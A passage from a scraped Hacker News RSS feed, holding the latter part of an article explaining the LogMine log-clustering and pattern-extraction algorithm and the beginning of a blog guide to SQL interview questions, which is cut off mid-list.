      <th><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi><mi>i</mi><mi>e</mi><mi>l</mi><msub><mi>d</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">Field_2</annotation></semantics></math></span></span></th>
      <th><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi><mi>i</mi><mi>e</mi><mi>l</mi><msub><mi>d</mi><mn>3</mn></msub></mrow><annotation encoding="application/x-tex">Field_3</annotation></semantics></math></span></span></th>
      <th>&nbsp;</th>
      <th>&nbsp;</th>
      <th>&nbsp;</th>
      <th>&nbsp;</th>
      <th>&nbsp;</th>
      <th><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi><mi>i</mi><mi>e</mi><mi>l</mi><msub><mi>d</mi><mi>n</mi></msub></mrow><annotation encoding="application/x-tex">Field_n</annotation></semantics></math></span></span></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code>&lt;time&gt;</code></td>
      <td>-</td>
      <td>[DEBUG]</td>
      <td>-</td>
      <td>User</td>
      <td>123</td>
      <td>disconnected</td>
      <td>&nbsp;</td>
      <td>&nbsp;</td>
    </tr>
    <tr>
      <td><code>&lt;time&gt;</code></td>
      <td>-</td>
      <td>[DEBUG]</td>
      <td>-</td>
      <td>User</td>
      <td>123</td>
      <td>disconnected</td>
      <td>&nbsp;</td>
      <td>&nbsp;</td>
    </tr>
    <tr>
      <td><code>&lt;time&gt;</code></td>
      <td>-</td>
      <td>[ERROR]</td>
      <td>-</td>
      <td>An</td>
      <td>error</td>
      <td>occurred</td>
      <td>while</td>
      <td>…</td>
    </tr>
    <tr>
      <td><code>&lt;time&gt;</code></td>
      <td>-</td>
      <td>[DEBUG]</td>
      <td>-</td>
      <td>User</td>
      <td>789</td>
      <td>disconnected</td>
      <td>&nbsp;</td>
      <td>&nbsp;</td>
    </tr>
  </tbody>
</table>

<p>I stopped at the word <code>while</code> for readability reasons, but there’s no limit to
the number of fields.</p>

<h4 id="identifying-dense-clusters">Identifying dense clusters</h4>

<p>Once this transformation is done, we will reduce these patterns into dense
clusters. Identifying dense clusters can be seen as a special use-case of the
clustering algorithm: we identify clusters but <strong>we skip the pattern extraction
step as these patterns are nearly identical</strong>.</p>

<p>As such, I’ll first introduce the clustering algorithm and the notion of
distance between patterns.</p>

<h3 id="grouping-patterns-into-clusters">Grouping patterns into clusters</h3>

<p>The clustering algorithm takes a list of patterns and identifies patterns that
are close to each other. Both the Tony Dinh’s implementation and the paper uses
the distance defined as:</p>

<p><span><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>Dist</mtext><mo stretchy="false">(</mo><mi>P</mi><mo separator="true">,</mo><mi>Q</mi><mo stretchy="false">)</mo><mo>=</mo><mn>1</mn><mo>−</mo><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mrow><mtext>Min</mtext><mo stretchy="false">(</mo><mtext>len</mtext><mo stretchy="false">(</mo><mi>P</mi><mo stretchy="false">)</mo><mo separator="true">,</mo><mtext>len</mtext><mo stretchy="false">(</mo><mi>Q</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo></mrow></munderover><mfrac><mrow><mtext>Score</mtext><mo stretchy="false">(</mo><msub><mi>P</mi><mi>i</mi></msub><mo separator="true">,</mo><msub><mi>Q</mi><mi>i</mi></msub><mo stretchy="false">)</mo></mrow><mrow><mtext>Max</mtext><mo stretchy="false">(</mo><mtext>len</mtext><mo stretchy="false">(</mo><mi>P</mi><mo stretchy="false">)</mo><mo separator="true">,</mo><mtext>len</mtext><mo stretchy="false">(</mo><mi>Q</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo></mrow></mfrac></mrow><annotation encoding="application/x-tex">\text{Dist}(P,Q) = 1 -
\sum_{i=1}^{\text{Min}(\text{len}(P),\text{len}(Q))}{\frac{\text{Score}(P_i,Q_i)}{\text{Max}(\text{len}(P),\text{len}(Q))}}</annotation></semantics></math></span></span></span></p><p>With P and Q, two patterns.</p>

<p>If the distance between the two patterns is inferior to a threshold <code>MaxDist</code>
defined internally, then the two patterns are considered a member of the same
cluster.</p>

<div>
  <p>This comparison process can be optimized by skipping unnecessary work if the
sum is already greater than our <code>MaxDist</code>.</p>

  <p>This is valid because the elements inside the sum can’t be negative.</p>
</div>

<p>The scoring function proposed in the paper allows for tweaking weights depending
on the field type.</p>

<p><span><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>Score</mtext><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo stretchy="false">)</mo><mo>=</mo><mrow><mo fence="true">{</mo><mtable rowspacing="0.3599999999999999em" columnalign="left left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>k</mi><mn>1</mn></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>if&nbsp;</mtext><mi>x</mi><mo>=</mo><mi>y</mi></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mtext>and&nbsp;both&nbsp;are&nbsp;fixed&nbsp;values</mtext></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>k</mi><mn>2</mn></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>if&nbsp;</mtext><mi>x</mi><mo>=</mo><mi>y</mi></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mtext>and&nbsp;both&nbsp;are&nbsp;variable</mtext></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mtext>otherwise</mtext></mstyle></mtd></mtr></mtable></mrow></mrow><annotation encoding="application/x-tex">\text{Score}(x, y) =
\begin{cases}
  k1 &amp;\text{if } x=y &amp;\text{and both are fixed values}\\
  k2 &amp;\text{if } x=y &amp;\text{and both are variable} \\
  0 &amp;\text{otherwise}
\end{cases}</annotation></semantics></math></span></span></span></p><p>In order to keep performance, the scoring function can’t return a negative
value. Therefore <code>k1</code> and <code>k2</code> can’t be negative.</p>

<div>
  <p><strong>Note</strong></p>

  <p>The definition of this scoring function seems to have left some place for interpretation:</p>
  <ul>
    <li>Tony Dinh’s implementation <a href="https://github.com/trungdq88/logmine/blob/a7595c6a0b313b43969199c18465cc8bec3b57d1/src/line_scorer.py#L29">checks for equality</a>
if both value are fixed values.</li>
    <li><a href="https://github.com/logpai/logparser/blob/master/logparser/LogMine/LogMine.py">LogPai’s LogParser</a> dropped the concept of variables and uses k2 to tune wildcards weight</li>
  </ul>

</div>

<p>Let’s define <code>k1=1</code> and <code>k2=1</code>, these are the weight used by Tony Dinh’s
implementation and recommended by the original paper.</p>

<h4 id="applying-the-clustering-algorithm">Applying the clustering algorithm</h4>

<p>For this example, I will use the original paper recommendation (<code>MaxDist=0.01</code>).
The MaxDist parameter is used to tune the algorithm sensitivity: the higher
<code>MaxDist</code>, the more patterns are detected.
If <code>MaxDist</code> is too high, patterns are grouped into very large clusters and
pattern extraction become meaningless.</p>

<table>
  <thead>
    <tr>
      <th>Fields from <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>L</mi><mi>o</mi><msub><mi>g</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">Log_1</annotation></semantics></math></span></span></th>
      <th>Fields from <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>L</mi><mi>o</mi><msub><mi>g</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">Log_2</annotation></semantics></math></span></span></th>
      <th>Score</th>
      <th>Sum (Total)</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code>&lt;time&gt;</code></td>
      <td><code>&lt;time&gt;</code></td>
      <td><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mn>1</mn><mn>7</mn></mfrac></mrow><annotation encoding="application/x-tex">\frac{1}{7}</annotation></semantics></math></span></span></td>
      <td><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mn>1</mn><mn>7</mn></mfrac></mrow><annotation encoding="application/x-tex">\frac{1}{7}</annotation></semantics></math></span></span></td>
    </tr>
    <tr>
      <td><code>-</code></td>
      <td><code>-</code></td>
      <td><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mn>1</mn><mn>7</mn></mfrac></mrow><annotation encoding="application/x-tex">\frac{1}{7}</annotation></semantics></math></span></span></td>
      <td><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mn>2</mn><mn>7</mn></mfrac></mrow><annotation encoding="application/x-tex">\frac{2}{7}</annotation></semantics></math></span></span></td>
    </tr>
    <tr>
      <td><code>[DEBUG]</code></td>
      <td><code>[DEBUG]</code></td>
      <td><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mn>1</mn><mn>7</mn></mfrac></mrow><annotation encoding="application/x-tex">\frac{1}{7}</annotation></semantics></math></span></span></td>
      <td><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mn>3</mn><mn>7</mn></mfrac></mrow><annotation encoding="application/x-tex">\frac{3}{7}</annotation></semantics></math></span></span></td>
    </tr>
    <tr>
      <td><code>-</code></td>
      <td><code>-</code></td>
      <td><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mn>1</mn><mn>7</mn></mfrac></mrow><annotation encoding="application/x-tex">\frac{1}{7}</annotation></semantics></math></span></span></td>
      <td><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mn>4</mn><mn>7</mn></mfrac></mrow><annotation encoding="application/x-tex">\frac{4}{7}</annotation></semantics></math></span></span></td>
    </tr>
    <tr>
      <td><code>User</code></td>
      <td><code>User</code></td>
      <td><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mn>1</mn><mn>7</mn></mfrac></mrow><annotation encoding="application/x-tex">\frac{1}{7}</annotation></semantics></math></span></span></td>
      <td><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mn>5</mn><mn>7</mn></mfrac></mrow><annotation encoding="application/x-tex">\frac{5}{7}</annotation></semantics></math></span></span></td>
    </tr>
    <tr>
      <td><code>123</code></td>
      <td><code>123</code></td>
      <td><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mn>1</mn><mn>7</mn></mfrac></mrow><annotation encoding="application/x-tex">\frac{1}{7}</annotation></semantics></math></span></span></td>
      <td><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mn>6</mn><mn>7</mn></mfrac></mrow><annotation encoding="application/x-tex">\frac{6}{7}</annotation></semantics></math></span></span></td>
    </tr>
    <tr>
      <td><code>disconnected</code></td>
      <td><code>disconnected</code></td>
      <td><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mn>1</mn><mn>7</mn></mfrac></mrow><annotation encoding="application/x-tex">\frac{1}{7}</annotation></semantics></math></span></span></td>
      <td><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mn>7</mn><mn>7</mn></mfrac></mrow><annotation encoding="application/x-tex">\frac{7}{7}</annotation></semantics></math></span></span></td>
    </tr>
  </tbody>
</table>

<p>The two logs belong to the same cluster as <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>−</mo><mfrac><mn>7</mn><mn>7</mn></mfrac><mo>&lt;</mo><mtext>MaxDist</mtext></mrow><annotation encoding="application/x-tex">1 - \frac{7}{7} &lt; \text{MaxDist}</annotation></semantics></math></span></span>.</p>

<table>
  <thead>
    <tr>
      <th>Fields from <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>L</mi><mi>o</mi><msub><mi>g</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">Log_1</annotation></semantics></math></span></span></th>
      <th>Fields from <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>L</mi><mi>o</mi><msub><mi>g</mi><mn>3</mn></msub></mrow><annotation encoding="application/x-tex">Log_3</annotation></semantics></math></span></span></th>
      <th>Score</th>
      <th>Sum (Total)</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code>&lt;time&gt;</code></td>
      <td><code>&lt;time&gt;</code></td>
      <td><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mn>1</mn><mn>11</mn></mfrac></mrow><annotation encoding="application/x-tex">\frac{1}{11}</annotation></semantics></math></span></span></td>
      <td><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mn>1</mn><mn>11</mn></mfrac></mrow><annotation encoding="application/x-tex">\frac{1}{11}</annotation></semantics></math></span></span></td>
    </tr>
    <tr>
      <td><code>-</code></td>
      <td><code>-</code></td>
      <td><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mn>1</mn><mn>11</mn></mfrac></mrow><annotation encoding="application/x-tex">\frac{1}{11}</annotation></semantics></math></span></span></td>
      <td><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mn>2</mn><mn>11</mn></mfrac></mrow><annotation encoding="application/x-tex">\frac{2}{11}</annotation></semantics></math></span></span></td>
    </tr>
    <tr>
      <td><code>[DEBUG]</code></td>
      <td><code>[ERROR]</code></td>
      <td>0</td>
      <td><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mn>2</mn><mn>11</mn></mfrac></mrow><annotation encoding="application/x-tex">\frac{2}{11}</annotation></semantics></math></span></span></td>
    </tr>
    <tr>
      <td><code>-</code></td>
      <td><code>-</code></td>
      <td><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mn>1</mn><mn>11</mn></mfrac></mrow><annotation encoding="application/x-tex">\frac{1}{11}</annotation></semantics></math></span></span></td>
      <td><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mn>3</mn><mn>11</mn></mfrac></mrow><annotation encoding="application/x-tex">\frac{3}{11}</annotation></semantics></math></span></span></td>
    </tr>
    <tr>
      <td><code>User</code></td>
      <td><code>An</code></td>
      <td>0</td>
      <td><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mn>3</mn><mn>11</mn></mfrac></mrow><annotation encoding="application/x-tex">\frac{3}{11}</annotation></semantics></math></span></span></td>
    </tr>
    <tr>
      <td><code>123</code></td>
      <td><code>error</code></td>
      <td>0</td>
      <td><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mn>3</mn><mn>11</mn></mfrac></mrow><annotation encoding="application/x-tex">\frac{3}{11}</annotation></semantics></math></span></span></td>
    </tr>
    <tr>
      <td><code>disconnected</code></td>
      <td><code>occurred</code></td>
      <td>0</td>
      <td><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mn>3</mn><mn>11</mn></mfrac></mrow><annotation encoding="application/x-tex">\frac{3}{11}</annotation></semantics></math></span></span></td>
    </tr>
  </tbody>
</table>

<p>The two logs do not belong to the same cluster as <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>−</mo><mfrac><mn>3</mn><mn>11</mn></mfrac><mo>&gt;</mo><mtext>MaxDist</mtext></mrow><annotation encoding="application/x-tex">1 - \frac{3}{11} &gt; \text{MaxDist}</annotation></semantics></math></span></span>.</p>

<div>
  <p><strong>Note</strong></p>

  <p>As we are using <code>MaxDist=0.01</code>, and since the logs in my example are very short,
we will only identify logs that are identical. For this reason, <strong>we can use the
clustering algorithm to identify dense clusters</strong> by skipping the pattern
recognition step.</p>
</div>

<h3 id="pattern-detection">Pattern detection</h3>

<p>In sequential (as opposed to MapReduce) mode, each time a pattern is inserted
in a cluster, LogMine will try to extract patterns from them. LogMine knows
only how to identify two types:</p>
<ul>
  <li>Fixed values</li>
  <li>Wildcards</li>
</ul>

<p>While it seems rather strict, remember that the early pattern detection during
tokenization already took care of identifying user-defined patterns.</p>

<div>
  <p>Generating the pattern each time a new pattern is added allows LogMine to only
keep one representative for each cluster. This is a very important factor to
reduce memory usage.</p>

  <p><strong>MapReduce behavior is described later in this article.</strong></p>
</div>

<p>As patterns in the same cluster can have a different number of fields, the paper
uses the <a href="https://en.wikipedia.org/wiki/Smith%E2%80%93Waterman_algorithm">Smith-Waterman</a>
algorithm to align them. The Smith-Waterman is mainly used in Bioinformatics to
align sequences. It is interesting to see an algorithm like this applied to
log pattern recognition.</p>

<p>Once the two patterns are aligned, we compare one by one the field:</p>
<ul>
  <li>If the value is equal, we assign a fixed value</li>
  <li>If the value is different, we assign a wildcard pattern</li>
</ul>

<p>The Smith-Waterman algorithm adds placeholders to align logs. These placeholders
are <strong>never equal</strong> to a field value. This means that aligned parts of a log are
always identified as wildcards.</p>

<p>The output of the pattern detection algorithm is a <strong>new list of patterns</strong>.</p>



<p>Let’s assume that the previous algorithm identified a cluster with two patterns:</p>
<div><div><pre><code>&lt;time&gt; - [DEBUG] - User 123 disconnected
&lt;time&gt; - [DEBUG] - User 789 disconnected
</code></pre></div></div>

<p>To stay consistent with how they were presented earlier, we will call them
<span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>L</mi><mi>o</mi><msub><mi>g</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">Log_1</annotation></semantics></math></span></span> and <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>L</mi><mi>o</mi><msub><mi>g</mi><mn>4</mn></msub></mrow><annotation encoding="application/x-tex">Log_4</annotation></semantics></math></span></span>.</p>

<table>
  <thead>
    <tr>
      <th><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>L</mi><mi>o</mi><msub><mi>g</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">Log_1</annotation></semantics></math></span></span></th>
      <th><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>L</mi><mi>o</mi><msub><mi>g</mi><mn>4</mn></msub></mrow><annotation encoding="application/x-tex">Log_4</annotation></semantics></math></span></span></th>
      <th>Result</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code>&lt;time&gt;</code></td>
      <td><code>&lt;time&gt;</code></td>
      <td><code>&lt;time&gt;</code></td>
    </tr>
    <tr>
      <td><code>-</code></td>
      <td><code>-</code></td>
      <td><code>Fixed value</code></td>
    </tr>
    <tr>
      <td><code>[DEBUG]</code></td>
      <td><code>[DEBUG]</code></td>
      <td><code>Fixed value</code></td>
    </tr>
    <tr>
      <td><code>-</code></td>
      <td><code>-</code></td>
      <td><code>Fixed value</code></td>
    </tr>
    <tr>
      <td><code>User</code></td>
      <td><code>User</code></td>
      <td><code>Fixed value</code></td>
    </tr>
    <tr>
      <td><code>123</code></td>
      <td><code>456</code></td>
      <td><code>Wildcard</code></td>
    </tr>
    <tr>
      <td><code>disconnected</code></td>
      <td><code>disconnected</code></td>
      <td><code>Fixed value</code></td>
    </tr>
  </tbody>
</table>

<h4 id="result-of-applying-the-smith-waterman-algorithm">Result of applying the Smith-Waterman algorithm</h4>

<p>Because examples in this article would have gotten very complex, I decided to
not use non-aligned logs in my examples. However, you might be curious as to how
the Smith-Waterman works.</p>

<p>On the implementation, LogMine would have aligned the two following patterns by
adding a <code>None</code> value in a field. For instance:</p>
<div><div><pre><code>&lt;time&gt; - [DEBUG] - User 123 disconnected
&lt;time&gt; - [DEBUG] - User 123 has disconnected
</code></pre></div></div>
<p>would become:</p>
<div><div><pre><code>&lt;time&gt; - [DEBUG] - User 123 &lt;None&gt; disconnected
&lt;time&gt; - [DEBUG] - User 123 has disconnected
</code></pre></div></div>

<div>
  <p><strong>The Smith-Waterman does not understand patterns</strong>. The Smith-Waterman uses
the same scoring function as the clustering algorithm. As such, if two fields
are not equal, there is no guarantee that the placeholder will be inserted
properly.</p>

  <p>If we tweak our previous example to:</p>
  <div><div><pre><code>&lt;time&gt; - [DEBUG] - User 123 disconnected
&lt;time&gt; - [DEBUG] - User 456 has disconnected
</code></pre></div>  </div>

  <p>The Smith-Waterman algorithm would transform it to:</p>
  <div><div><pre><code>&lt;time&gt; - [DEBUG] - User &lt;None&gt; 123 disconnected
&lt;time&gt; - [DEBUG] - User 456 has disconnected
</code></pre></div>  </div>

  <p>The alignment was added <strong>before</strong> the user identifier.</p>
</div>

<h3 id="repeat-until-satisfied">Repeat until satisfied</h3>

<p>As the pattern extraction algorithm returns a list of patterns, we can relax
<code>MaxDist</code> and feed this list back into the clustering algorithm.</p>

<p>In <strong>3.4 Hierarchy of Patterns</strong>, the paper describes a process to generate a
hierarchy of possible patterns from very strict to …</p></div></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://sayr.us/log-pattern-recognition/logmine/">https://sayr.us/log-pattern-recognition/logmine/</a></em></p>]]>
            </description>
            <link>https://sayr.us/log-pattern-recognition/logmine/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25710991</guid>
            <pubDate>Sun, 10 Jan 2021 05:50:45 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A guide to SQL interview questions]]>
            </title>
            <description>
<![CDATA[
Score 8 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25709870">thread link</a>) | @data4lyfe
<br/>
January 9, 2021 | https://www.interviewquery.com/blog-sql-interview-questions/ | <a href="https://web.archive.org/web/*/https://www.interviewquery.com/blog-sql-interview-questions/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
                <div>
                    <p><strong>Table of Contents</strong></p><!--kg-card-begin: html-->
<!--kg-card-end: html--><h3 id="introduction">Introduction</h3><p>SQL is the good old friend that has always worked. It’s something you always come back to, even as Pandas, Julia, Spark, Hadoop, and NoSql attempt to dethrone and replace SQL as the new de-facto data tool.</p><p>Eventually though, they all fail in the face of the consistently reliable SQL. And that's why SQL continues to get asked in interviews. </p><blockquote><strong>A note before we start...</strong></blockquote><blockquote>This guide should be used for anyone who is preparing for an interview in which they know SQL will show up. This guide<strong> is not</strong> a search engine optimized listacle (top 50 sql questions for 2021...really?).</blockquote><blockquote>Rather, this is <strong>real advice and REAL interview questions and exercises </strong>gathered from hundreds of data scientists, engineers, and analysts. We sprinkle exercises throughout this post after learning concepts. Be sure to try attempting the questions first before we walk through solving them. &nbsp;</blockquote><blockquote>Lastly, if you enjoy this article, <strong>please give us a share</strong> and check out our <a href="https://www.interviewquery.com/courses/data-science-course">SQL course</a> that goes a little deeper with more exercises and problems. </blockquote><h2 id="1-why-does-sql-show-up-on-the-interview">1. Why does SQL show up on the interview?</h2><figure><img src="https://blog.interviewquery.com/content/images/2021/01/image-6.png" alt="" srcset="https://blog.interviewquery.com/content/images/2021/01/image-6.png 600w"></figure><p>SQL allows data scientists and engineers to do a couple of important things.</p><p>One is to <strong>effectively store and retrieve information at scale for analytics</strong>. Even though Google Sheets allows users to easily manipulate and visualize data, it cannot store and scale like a SQL database can. Other popular programs –namely Hadoop and Spark– can scale much further than SQL, but still don’t have a clean and easy-to-use language like SQL to retrieve data efficiently.</p><p>Another great thing about SQL is that understanding the fundamentals bridges the gap between <strong>engineering and data science</strong>. Knowing SQL well gives you a competitive edge over any other candidate, whether you're competing for a position as a product manager, software engineer, or even as a business analyst. Having the skillset to write and pull your own queries is like being a magician that can come up with analyses out of thin air. </p><p>And at the end of the day, you could just be really good at SQL if you wanted to and make tons of money creating ETL jobs or pulling dashboards with efficiency. That's how valued SQL is. </p><h3 id="how-often-does-sql-show-up-in-interviews">How often does SQL show up in interviews?</h3><p>One prevailing question is how often SQL shows up in interviews. </p><p>At Interview Query, we analyzed a dataset of Glassdoor data science interview experiences and responses submitted by our users. The analysis came back that SQL was asked:</p><ul><li><a href="https://www.interviewquery.com/interview-experiences/facebook/data-scientist" rel="nofollow">70% of the time during Facebook’s data science interviews</a></li><li><a href="https://www.interviewquery.com/interview-experiences/Amazon/business-analyst" rel="nofollow">94% of the time during Amazon’s business intelligence and analyst interviews</a></li></ul><figure><img src="https://blog.interviewquery.com/content/images/2021/01/image-7.png" alt="" srcset="https://blog.interviewquery.com/content/images/size/w600/2021/01/image-7.png 600w, https://blog.interviewquery.com/content/images/size/w1000/2021/01/image-7.png 1000w, https://blog.interviewquery.com/content/images/2021/01/image-7.png 1262w" sizes="(min-width: 720px) 720px"><figcaption><a href="https://www.interviewquery.com/interview-experiences/facebook/data-scientist">Skills tested in Facebook's Data Science Interview as of 2021</a></figcaption></figure><p>Due to its nature in being able to get and manipulate your own data, this is by far the most important skill now towards nabbing a data science position. And while pandas and other languages are useful, note that <a href="https://www.interviewquery.com/blog-why-your-data-scientist-interviewer-wont-ask-pandas-questions/" rel="nofollow">SQL will always be the one that matters</a>.</p><h2 id="2-strategies-for-the-live-sql-interview">2. Strategies for the live SQL interview</h2><p>Let's go over the common strategies when tackling SQL interview questions. </p><p><strong>1.Repeat the problem statement</strong></p><p>When presented with a SQL question, listen carefully to the problem description and repeat back what you think the crux of the problem is. The interviewer can then help verify if your understanding is correct.</p><p><strong>2. Understand the edge cases</strong></p><p>If time permits, write out a base case and an edge case to show that you understand the problem. For example: if the interviewer asks you to pull the average number of events per user per day, write out an example scenario where you're verifying this metric. </p><p>Do duplicate events matter? Are we looking at distinct users? These are questions we need to clarify. </p><p><strong>3. Try working backwards if the problem is tricky</strong></p><p>Sketching out what the output of the SQL question will look like is a great strategy towards solving the problem. Usually, if I know what the end output table is supposed to look like, I can work backwards from there on what functions need to be applied before. </p><p>For example, if the output looks like this:</p><pre><code>date        | average events per user
------------+-----------------------
2021-12-01  |  3.5
2021-12-02  |  4.0</code></pre><p>I know that the table before this aggregation would have to look something like this.</p><pre><code>date       | event | user_id
-----------+-------+--------
2021-12-01 | click | 1
2021-12-01 | view  | 1
......</code></pre><p>And then, I can figure out what functions I should use to get to my desired output!</p><p><strong>4. Pattern match to different functions</strong></p><p>As you practice more and more SQL exercises, what you'll find is that many SQL problems follow similar patterns. There are techniques we can use in SQL, like utilizing <code>HAVING</code> on aggregations, self-joins and cross-joins, and applying window functions. But, additionally, we'll see problems that run in a similar vein. </p><p>For example, writing a query to get the second highest salary or writing a query to isolate every fifth purchase by a user utilizes the same <code>RANK</code> function in SQL. </p><p>Understanding the commonalities between questions will help you understand the first step to solving SQL questions faster because you can re-use similar code and stitch together techniques on top of each other. </p><p><strong>5. Start writing SQL</strong></p><p>Finally, it's important to just start writing SQL. It's better to start writing an imperfect solution vs trying to perfectly understand the problem or trying to perfect the solution on the first try. </p><p>Verbalize your assumptions and what you're doing as you write SQL and your interviewer can then be put on the same page as you. </p><h2 id="3-the-7-different-sql-interview-questions">3. The 7 different SQL interview questions</h2><p>SQL questions asked during interviews can vary widely across companies, but even more so across positions. You won't see data scientists asked the same SQL questions as software engineers, and that's because data scientists have to write different types of queries compared to software engineers. </p><p>Generally, each SQL interview question can be bucketed into these categories:</p><ul><li>Definition based SQL questions</li><li>Basic SQL questions</li><li>Reporting and metrics SQL questions</li><li>Analytics SQL questions</li><li>ETL SQL questions</li><li>Database design questions</li><li>Logic based SQL questions</li></ul><p>In this next section, we'll go over which types of SQL questions are expected for different roles and what those different kinds of SQL questions are in detail. </p><h2 id="4-sql-questions-for-data-scientists-and-analysts">4. SQL questions for data scientists and analysts</h2><p>SQL interview questions for data scientists and data analysts will likely show up in three parts of the interview process: the technical round, the take-home challenge, and the onsite interview. </p><p>The technical round and take-home challenge will usually consist of SQL questions <strong>designed to filter out candidates</strong>. Since SQL is commonly used as a filter mechanism for data scientists, it's important to perform well on this part of the interview in order to demonstrate competence. </p><p>Depending on what type of data science role you're interviewing for, you'll find that most SQL questions will be split into these three types:</p><ul><li>Basic SQL Interview Questions</li><li>Reporting and Metrics SQL Interview Questions</li><li>Analytics SQL Interview Questions</li></ul><h3 id="basic-sql-interview-questions">Basic SQL Interview Questions</h3><p>Basic SQL questions are what they sound like. These questions will be generally easy and focus on assessing if you know the basics. </p><p><strong>Definition based SQL questions </strong>are grouped into this category because they're super easy to learn. All you have to do is study a list of definitions of SQL terms and applications. These questions will include understanding the differences between joins, what kinds of aggregations exist, and knowing the basic functions like <code>CASE WHEN</code> or <code>HAVING</code>. </p><p>Basic SQL interview questions that involve a user actually writing a query are slightly different. These will involve getting the <code>COUNT</code> of a table, knowing what the <code>HAVING</code> clause does, and figuring out how to utilize <code>LEFT JOIN</code> versus <code>INNER JOIN</code> to give you the values that you need.</p><blockquote>Read more on the the <a href="https://www.interviewquery.com/blog-three-sql-questions-you-must-know-to-pass/">basic concepts you need to know to pass your data science interview</a> here. </blockquote><figure><a href="https://www.interviewquery.com/blog-three-sql-questions-you-must-know-to-pass/"><div><p>Three SQL Concepts for your Data Scientist Interview</p><p>I’ve interviewed a lot of data scientist candidates and have found there are a a lot of SQL interview questions for data science that eventually boil down to three generalized types of conceptual understandings.</p><p><img src="https://blog.interviewquery.com/favicon.ico"><span>Interview Query Blog</span></p></div><p><img src="https://blog.interviewquery.com/content/images/2020/02/sql_join.jpeg"></p></a></figure><p><strong>Basic SQL Concepts to Review</strong></p><ul><li>What's the difference between a <code>LEFT JOIN</code> and an <code>INNER JOIN</code>?</li><li>When would you use 